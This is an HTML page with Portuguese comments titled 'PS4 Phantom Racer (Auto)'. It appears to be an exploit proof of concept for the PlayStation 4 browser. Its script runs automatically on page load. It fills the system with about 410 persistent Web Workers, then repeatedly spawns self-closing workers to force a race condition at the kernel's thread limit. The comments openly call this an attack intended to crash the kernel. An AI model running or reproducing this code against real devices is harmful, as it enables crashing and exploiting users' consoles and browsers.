<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 Phantom Racer (Auto)</title>
    
</head>
<body>

    <div id="status">INICIANDO...</div>
    <div id="counter">0</div>
    <div id="phase">FASE 1: ENCHIMENTO (Leve)</div>
    <div class="progress"><div id="bar" class="bar"></div></div>

    <script>
        // CONFIGURAÇÃO
        const FILL_TARGET = 410; // Enche até aqui com segurança
        const CRASH_TARGET = 430; // O alvo teórico do crash (419 real)
        
        let workers = [];
        
        // WORKER "FANTASMA" (Otimizado para pouca RAM)
        // Apenas existe. Não processa mensagens, não faz loops rápidos.
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);

        // WORKER "KAMIKAZE" (Para a fase de Race)
        const raceBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const raceUrl = URL.createObjectURL(raceBlob);

        function updateUI(count) {
            // Otimização: Só atualiza o DOM a cada 5 workers para reduzir LAG
            if (count % 5 === 0) {
                document.getElementById('counter').innerText = count;
                const pct = (count / FILL_TARGET) * 100;
                document.getElementById('bar').style.width = pct + "%";
            }
        }

        function startFilling() {
            document.getElementById('status').innerText = "ALOCANDO THREADS...";
            
            let i = setInterval(() => {
                // Cria workers em lote pequeno para não travar a UI de uma vez
                for(let k=0; k<2; k++) {
                    if (workers.length < FILL_TARGET) {
                        const w = new Worker(url);
                        workers.push(w);
                    } else {
                        // Alvo atingido. Para o enchimento e inicia o ataque.
                        clearInterval(i);
                        startRaceMode();
                        return;
                    }
                }
                updateUI(workers.length);
            }, 10); // Intervalo suave
        }

        function startRaceMode() {
            document.getElementById('phase').innerText = "FASE 2: RACE CONDITION (410 -> 425)";
            document.getElementById('phase').style.color = "#f00";
            document.getElementById('phase').style.borderColor = "#f00";
            document.getElementById('bar').style.background = "#f00";
            
            // Aqui começa o caos automatizado
            // Não usamos mais o array 'workers' para não consumir RAM guardando referências
            // Apenas lançamos workers no vazio para bater no teto do Kernel
            
            setInterval(() => {
                // Tenta criar 5 workers Kamikazes
                // Eles nascem, tentam ocupar o slot 411-420 e morrem sozinhos (self.close)
                for(let j=0; j<5; j++) {
                    try {
                        new Worker(raceUrl);
                    } catch(e) {
                        // Se der erro, ótimo (Kernel cheio)
                    }
                }
                
                // A cada X milissegundos, tentamos um worker persistente para ver se "cola"
                // Se o slot 419 liberar por 1ms, tentamos pegar ele.
                try {
                    const w = new Worker(url);
                    workers.push(w); // Se conseguiu criar, guarda
                    document.getElementById('counter').innerText = workers.length;
                } catch(e) {}

                // Se por acaso passarmos muito do ponto, mata alguns para manter a oscilação
                if(workers.length > CRASH_TARGET) {
                    workers.shift().terminate();
                    workers.shift().terminate();
                }

            }, 20); // Velocidade de ataque
        }

        // Início automático
        setTimeout(startFilling, 1000);

    </script>
</body>
</html>
